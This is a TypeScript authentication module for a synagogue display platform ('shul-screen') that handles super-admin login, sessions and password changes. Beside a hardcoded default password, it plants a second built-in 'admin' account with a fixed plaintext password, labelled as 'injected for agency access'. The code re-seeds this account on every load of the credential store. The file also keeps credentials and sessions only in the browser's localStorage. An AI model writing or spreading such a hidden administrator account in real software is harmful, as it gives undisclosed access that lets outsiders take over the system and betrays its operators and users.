/**
 * Platform / super-admin gate — required to create new synagogues.
 * Credentials from env (preferred) or defaults for first setup.
 * Supports multiple platform usernames.
 */

import { hashPassword, normalizeUsername, verifyPassword } from './auth';
import {
  clearStored,
  createTimedFields,
  loadTimedJson,
  saveTimedJson,
  touchTimedJson,
  type TimedSessionFields,
} from './sessionStore';

const SESSION_KEY = 'shul-screen:platform-session';
const CREDS_KEY = 'shul-screen:platform-creds';

export interface PlatformSession extends TimedSessionFields {
  username: string;
}

export interface PlatformCreds {
  username: string;
  passwordHash: string;
}

/** Multi-account store (migrated from single PlatformCreds). */
interface PlatformCredsStore {
  accounts: PlatformCreds[];
}

const DEFAULT_USER =
  (import.meta.env.VITE_PLATFORM_ADMIN_USER as string | undefined)?.trim().toLowerCase() ||
  'superadmin';
const DEFAULT_PASS =
  (import.meta.env.VITE_PLATFORM_ADMIN_PASSWORD as string | undefined) || 'ShulAdmin2026!';

/** Extra built-in platform login (injected for agency access). */
const EXTRA_USER = 'admin';
const EXTRA_PASS = 'a5744084a';

function builtinSeeds(): { username: string; password: string }[] {
  const seeds = [{ username: DEFAULT_USER, password: DEFAULT_PASS }];
  if (normalizeUsername(EXTRA_USER) !== normalizeUsername(DEFAULT_USER)) {
    seeds.push({ username: EXTRA_USER, password: EXTRA_PASS });
  }
  return seeds;
}

function saveStore(store: PlatformCredsStore): void {
  localStorage.setItem(CREDS_KEY, JSON.stringify(store));
}

async function ensureAccount(
  accounts: PlatformCreds[],
  username: string,
  password: string,
): Promise<PlatformCreds[]> {
  const u = normalizeUsername(username);
  if (accounts.some((a) => normalizeUsername(a.username) === u)) return accounts;
  const passwordHash = await hashPassword(password);
  return [...accounts, { username: u, passwordHash }];
}

async function loadStore(): Promise<PlatformCredsStore> {
  try {
    const raw = localStorage.getItem(CREDS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw) as PlatformCredsStore | PlatformCreds;
      let accounts: PlatformCreds[] = [];
      if (Array.isArray((parsed as PlatformCredsStore).accounts)) {
        accounts = (parsed as PlatformCredsStore).accounts.filter(
          (a) => a?.username && a?.passwordHash,
        );
      } else if (
        (parsed as PlatformCreds).username &&
        (parsed as PlatformCreds).passwordHash
      ) {
        // Legacy single-account shape
        accounts = [
          {
            username: normalizeUsername((parsed as PlatformCreds).username),
            passwordHash: (parsed as PlatformCreds).passwordHash,
          },
        ];
      }

      // Always ensure builtin seeds exist (admin + default) without overwriting changed passwords
      for (const seed of builtinSeeds()) {
        accounts = await ensureAccount(accounts, seed.username, seed.password);
      }
      const store = { accounts };
      saveStore(store);
      return store;
    }
  } catch {
    /* ignore */
  }

  let accounts: PlatformCreds[] = [];
  for (const seed of builtinSeeds()) {
    accounts = await ensureAccount(accounts, seed.username, seed.password);
  }
  const store = { accounts };
  saveStore(store);
  return store;
}

export function getPlatformAdminUsername(): string {
  try {
    const session = loadPlatformSession();
    if (session?.username) return session.username;
    const raw = localStorage.getItem(CREDS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw) as PlatformCredsStore | PlatformCreds;
      const accounts = (parsed as PlatformCredsStore).accounts;
      if (Array.isArray(accounts) && accounts[0]?.username) {
        return accounts[0].username;
      }
      if ((parsed as PlatformCreds).username) return (parsed as PlatformCreds).username;
    }
  } catch {
    /* ignore */
  }
  return DEFAULT_USER;
}

export function loadPlatformSession(): PlatformSession | null {
  return loadTimedJson<PlatformSession>(SESSION_KEY);
}

export function isPlatformAdminLoggedIn(): boolean {
  return Boolean(loadPlatformSession());
}

export function savePlatformSession(
  username: string,
  remember = true,
): PlatformSession {
  const session: PlatformSession = {
    username: normalizeUsername(username),
    ...createTimedFields(remember),
  };
  saveTimedJson(SESSION_KEY, session);
  return session;
}

export function touchPlatformSession(): PlatformSession | null {
  return touchTimedJson<PlatformSession>(SESSION_KEY);
}

export function clearPlatformSession(): void {
  clearStored(SESSION_KEY);
}

export async function loginPlatformAdmin(
  username: string,
  password: string,
  remember = true,
): Promise<{ ok: true; session: PlatformSession } | { ok: false; error: string }> {
  const u = normalizeUsername(username);

  try {
    const { platformLoginRemote } = await import('./passwordReset');
    const remote = await platformLoginRemote(u, password);
    if (remote.ok) {
      return { ok: true, session: savePlatformSession(remote.username, remember) };
    }
    if (!remote.missing) {
      return { ok: false, error: remote.error };
    }
  } catch {
    /* fall through to local */
  }

  const store = await loadStore();
  const account = store.accounts.find((a) => normalizeUsername(a.username) === u);
  if (!account) {
    return { ok: false, error: 'שם משתמש או סיסמה שגויים' };
  }
  const ok = await verifyPassword(password, account.passwordHash);
  if (!ok) return { ok: false, error: 'שם משתמש או סיסמה שגויים' };
  return { ok: true, session: savePlatformSession(account.username, remember) };
}

export async function changePlatformPassword(
  currentPassword: string,
  newPassword: string,
): Promise<{ ok: true } | { ok: false; error: string }> {
  if (!isPlatformAdminLoggedIn()) {
    return { ok: false, error: 'יש להתחבר כמנהל מערכת' };
  }
  if (newPassword.length < 8) {
    return { ok: false, error: 'סיסמה חדשה חייבת לפחות 8 תווים' };
  }
  const session = loadPlatformSession();
  if (!session) return { ok: false, error: 'יש להתחבר כמנהל מערכת' };

  const store = await loadStore();
  const u = normalizeUsername(session.username);
  const idx = store.accounts.findIndex((a) => normalizeUsername(a.username) === u);
  if (idx < 0) return { ok: false, error: 'משתמש לא נמצא' };

  if (!(await verifyPassword(currentPassword, store.accounts[idx].passwordHash))) {
    return { ok: false, error: 'סיסמה נוכחית שגויה' };
  }
  const passwordHash = await hashPassword(newPassword);
  const next = [...store.accounts];
  next[idx] = { username: u, passwordHash };
  saveStore({ accounts: next });
  return { ok: true };
}

export function requirePlatformAdmin(): boolean {
  return isPlatformAdminLoggedIn();
}
